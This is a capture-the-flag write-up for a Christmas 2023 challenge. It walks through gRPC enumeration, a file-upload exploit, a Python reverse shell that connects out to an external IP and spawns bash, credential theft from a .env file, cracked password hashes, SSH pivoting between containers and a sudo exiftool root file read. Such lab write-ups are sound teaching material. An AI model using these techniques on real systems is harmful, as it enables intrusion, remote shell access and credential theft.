# CTF Challenge Write-Up

## Part 1: gRPC Exploitation

A directory scan was performed with `feroxbuster`

```sh
â”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/cema/xmas-2023/exploitation/ctf_challenge]
â””â”€$ feroxbuster -u http://167.172.109.120:5002/career/ -o feroxbuster.out -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ðŸ¤“                 ver: 2.10.1
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ðŸŽ¯  Target Url            â”‚ http://167.172.109.120:5002/career/
 ðŸš€  Threads               â”‚ 50
 ðŸ“–  Wordlist              â”‚ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 ðŸ‘Œ  Status Codes          â”‚ All Status Codes!
 ðŸ’¥  Timeout (secs)        â”‚ 7
 ðŸ¦¡  User-Agent            â”‚ feroxbuster/2.10.1
 ðŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ðŸ”Ž  Extract Links         â”‚ true
 ðŸ’¾  Output File           â”‚ feroxbuster.out
 ðŸ  HTTP methods          â”‚ [GET]
 ðŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ðŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET      111l      349w     4534c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      123l      374w     4991c http://167.172.109.120:5002/career/old
[#>------------------] - 10m    11395/220577  3h      found:1       errors:2121  
```

Visiting `http://167.172.109.120:5002/career/old` showed us a page with a `challenge.proto` file which could be downloaded.

```py
syntax = "proto3";

// grpc server is listening on 50051

package challenge;

service ChallengeService {
  rpc GetCVURI(GetCVURIRequest) returns (GetCVURIResponse);
  rpc GetFlag(GetFlagRequest) returns (GetFlagResponse);
}

message GetCVURIRequest {}

message GetCVURIResponse {
  string cv_uri = 1;
}

message GetFlagRequest {}

message GetFlagResponse {
  string flag = 1;
}
```

A `challenge.proto` file was found, indicating a `gRPC` service. A Python `gRPC` client was created to interact with this service, leading to the discovery of the first flag.

For this we needed to talk to the `gRPC` service, in order to do that we need to compile the `.proto` file.

```sh
python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. challenge.proto
```

Next we need a client script to connect to the `gRPC` server at the specified address and port, then perform the RPC calls defined in the `.proto` file.

```python
import grpc
import challenge_pb2
import challenge_pb2_grpc

def run():
    # Assuming the server is running on the same host and port 50051
    with grpc.insecure_channel('167.172.109.120:50051') as channel:
        stub = challenge_pb2_grpc.ChallengeServiceStub(channel)
        
        # To get CV URI
        cv_uri_request = challenge_pb2.GetCVURIRequest()
        cv_uri_response = stub.GetCVURI(cv_uri_request)
        print("CV URI:", cv_uri_response.cv_uri)

        # To get Flag
        get_flag_request = challenge_pb2.GetFlagRequest()
        get_flag_response = stub.GetFlag(get_flag_request)
        print("Flag:", get_flag_response.flag)

if __name__ == '__main__':
    run()
```

### Output from running the gRPC client

```sh
CV URI: navigate to /career/upload-your-cv to upload your CV
Flag: CEMA{GRPC_HERO_YOU_ARE}
```

## Part 2: Initial Access and Enumerating the Website

The output from the gRPC client told us the upload loaction `/career/upload-your-cv`

Visiting <http://167.172.109.120:5002/career/upload-your-cv> showed an upload button for `pdf's` but we could upload any file as long as it ends on `.pdf`

One uploaded thew website tells you where the files can be found:

<http://167.172.109.120:5002/static/cv_upload/your-pdf.pdf>

### Exploiting File Upload for Access

With the ability to upload files, a Python reverse shell script was crafted and uploaded to gain remote access:

```python
#!/usr/bin/env python
import os
import pty
import socket

from multiprocessing import Process

def revshell():
    s=socket.socket();
    s.connect(("136.144.163.185",44556));
    [os.dup2(s.fileno(),f)for f in(0,1,2)];
    pty.spawn("/bin/bash")


if __name__ == '__main__':
    p = Process(target=revshell)
    p.start()
```

### Obtaining the Second Flag

Once the reverse shell was established, further exploration of the server was conducted, leading to the discovery of the second flag:

```sh
# Command to view the flag
cat flag.txt

# Output
CEMA{NOT_ALL_PDFS_ARE_EQUAL}
```

## Part 3: Database Access and Password Cracking

Credentials for a PostgreSQL database were found. Accessing the database and cracking hashed passwords from the users table revealed more information.

```sh
appuser@frontend_app:~$ cat /app/src/.env
cat /app/src/.env
POSTGRES_USER=growtech
POSTGRES_PASSWORD=dontbenaughty
DB_HOST=database_app
DB_PORT=5432
POSTGRES_DB=growtech
appuser@frontend_app:~$
```

```bash
# Accessing the PostgreSQL database
psql -h database_app -p 5432 -U growtech -d growtech
```

```bash
# Listing tables and cracking passwords
\dt
SELECT * FROM users;

 id | username  |                             password                          

----+-----------+------------------------------------------------------------------
  1 | jason     | 367a8ecbf59820480aaa7ca145b1c1f7cb928480c00757f2694ed728952677df
  2 | mike      | 9524507d4b08e2c2ceaca11c161eb4190f98f54894bf2b9326759530e03d636e
  3 | kyra      | d6f8f1e262a45cb38a19d5ae3bebcbf86064e2ae2fa27d9328d3713aaf8b9847
  4 | brian     | 7a7bd81de4e6575c4c01a3f62f1ad4b715f3aa2c101a4e4e0dd247baeb423a5c
  5 | mounia    | 47108981a5e04d0371ba17856013b0563130f964f1380212cf092d43868c8a91
  6 | polestar  | 01621148306fc8fb7c2b95eeb5c37e375f90db53cf8313ea87c9c34c05b7e0e5
  7 | rudolph   | 73cd1b16c4fb83061ad18a0b29b9643a68d4640075a466dc9e51682f84a847f5
  8 | grinch    | fcfd075cbe367c158d5cfaa31fa06656a3e68f626388d96ee81b35dda4310b58
  9 | snowflake | e2ca6aec52558fcc04311983bad03e38ca5e799c239d202ae7a4f58aff8a6970
 10 | santa     | 7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35
```

### Password cracking via crackstation

<https://crackstation.net/>

```bash
 id | username  |                             Hash                                  |   Password
----+-----------+-------------------------------------------------------------------+------------
  1 | jason     | 367a8ecbf59820480aaa7ca145b1c1f7cb928480c00757f2694ed728952677df  |   Not found
  2 | mike      | 9524507d4b08e2c2ceaca11c161eb4190f98f54894bf2b9326759530e03d636e  |   Not found
  3 | kyra      | d6f8f1e262a45cb38a19d5ae3bebcbf86064e2ae2fa27d9328d3713aaf8b9847  |   Not found
  4 | brian     | 7a7bd81de4e6575c4c01a3f62f1ad4b715f3aa2c101a4e4e0dd247baeb423a5c  |   Not found
  5 | mounia    | 47108981a5e04d0371ba17856013b0563130f964f1380212cf092d43868c8a91  |   Not found
  6 | polestar  | 01621148306fc8fb7c2b95eeb5c37e375f90db53cf8313ea87c9c34c05b7e0e5  |   michelle
  7 | rudolph   | 73cd1b16c4fb83061ad18a0b29b9643a68d4640075a466dc9e51682f84a847f5  |   superman
  8 | grinch    | fcfd075cbe367c158d5cfaa31fa06656a3e68f626388d96ee81b35dda4310b58  |   butterfly
  9 | snowflake | e2ca6aec52558fcc04311983bad03e38ca5e799c239d202ae7a4f58aff8a6970  |   dragonfly
 10 | santa     | 7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35  |   chocolate
```

Enumerating further i found more ip addresses

```sh
appuser@frontend_app:/app$ ping -c 4 backend_app
ping -c 4 backend_app
ping: backend_app: Temporary failure in name resolution
appuser@frontend_app:/app$ ping -c 4 database_app
ping -c 4 database_app
PING database_app (172.29.0.3) 56(84) bytes of data.
64 bytes from database_app.docker_ctf_challenge_frontend_net (172.29.0.3): icmp_seq=1 ttl=64 time=0.068 ms
64 bytes from database_app.docker_ctf_challenge_frontend_net (172.29.0.3): icmp_seq=2 ttl=64 time=0.084 ms
64 bytes from database_app.docker_ctf_challenge_frontend_net (172.29.0.3): icmp_seq=3 ttl=64 time=0.085 ms
64 bytes from database_app.docker_ctf_challenge_frontend_net (172.29.0.3): icmp_seq=4 ttl=64 time=0.095 ms

--- database_app ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3087ms
rtt min/avg/max/mdev = 0.068/0.083/0.095/0.009 ms
```

## Part 4: Container Pivoting

Using cracked credentials, access was gained to different Docker containers (database_app and backend_app), where additional flags were discovered.

### Accessing the database_app container

```bash
ssh santa@172.29.0.3
cat flag.txt
CEMA{ENV_VARS_REVEAL_MANY_THINGS}
```

There was not much on this machine, maybe the creds work on a different ip too?

### Accessing the backend_app container

```bash
ssh santa@172.30.0.2
cat flag.txt
CEMA{INSIDE_THE_BACKEND}
```

## Part 5: Privilege Escalation and Final Flag

Within the backend_app container, it was found that santa had sudo privileges to run exiftool. This was exploited to read the root's flag file.
Commands and Output

```bash
# Checking sudo privileges
backend_app:~$ sudo -l  
sudo -l
[sudo] password for santa: chocolate

User santa may run the following commands on backend_app:
    (ALL) /usr/local/bin/exiftool
```

### Exploiting exiftool to read root's flag

```bash
sudo /usr/local/bin/exiftool -o - /root/flag.txt
CEMA{KING_OF_GROWTECH}
```

This write-up summarizes the key steps taken to solve the CTF challenge, highlighting the methodologies used, the challenges faced, and how they were overcome. For a comprehensive report, each section can be expanded with more detailed descriptions, screenshots, and reflections on the learning outcomes.
